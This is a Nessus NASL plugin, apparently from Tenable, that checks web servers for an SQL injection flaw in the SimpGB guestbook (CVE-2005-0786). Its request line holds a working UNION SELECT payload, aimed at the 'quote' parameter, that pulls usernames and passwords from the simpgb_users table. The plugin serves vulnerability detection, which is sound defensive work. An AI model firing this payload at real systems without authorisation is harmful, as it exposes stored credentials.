#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(17328);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-0786");
  script_bugtraq_id(12801);

  name["english"] = "SimpGB Guestbook.PHP SQL Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running SimpGB, a web-based guestbook application.

This version of SimpGB is vulnerable to a remote SQL injection flaw. 
An attacker, exploiting this flaw, would only need to be able to send
a malformed query to the 'quote' parameter of the 'guestbook.php' 
application.

A successful exploit would give the attacker the ability to read or 
write confidential data as well as potentially execute arbitrary 
commands on the remote web server.

Solution : Upgrade to version 1.35 or later.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for SQL injection in SimpGB";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

dirs = make_list(cgi_dirs());
xtra_dirs = make_array(
  "/gb", 1,
  "/simpgb", 1
);
foreach dir (dirs) {
  # Set value to zero if it's already in dirs.
  if (!isnull(xtra_dirs[dir])) xtra_dirs[dir] = 0;
}
foreach dir (keys(xtra_dirs)) {
  # Add it to dirs if the value is still set.
  if (xtra_dirs[dir]) dirs = make_list(dirs, dir);
}


foreach dir (dirs) {
  req = http_get(item:string(dir, "/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if (egrep(
    string:res, 
    pattern:"Am 0000-00-00 00:00:00 schrieb "
  )) {
    security_hole(port);
    exit(0);
  }
}
